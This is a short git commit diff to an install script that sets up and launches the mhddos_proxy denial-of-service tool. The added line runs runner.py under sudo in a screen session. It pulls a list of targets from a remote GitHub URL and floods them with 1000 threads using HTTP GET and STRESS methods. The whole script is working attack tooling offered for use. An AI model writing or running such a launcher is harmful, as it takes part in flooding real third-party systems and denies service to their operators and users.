b3c70b1eef4c21029180b5329cf5664f848dbef4
Иван Орищенко <44241496+ifest1val@users.noreply.github.com>
2022-04-24 22:56:23 +0300

    Update install.sh

--- install/install.sh
+++ install/install.sh
@@ -1,9 +1,11 @@
+#!/bin/bash
 cd ~
 sudo apt update -y
 sudo apt install --upgrade git -y
 sudo apt install --upgrade python3 -y
 sudo apt install --upgrade python3-pip -y
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd mhddos_proxy
+cd mhddos_proxy/
 ulimit -n 1048576
 sudo python3 -m pip install -r requirements.txt
+screen -S "nalog2" sudo  python3 runner.py -c https://raw.githubusercontent.com/ifest1val/itarmy/main/address/pack_1 -t 1000 --rpc 2000 --http-methods GET STRESS --debug --vpn
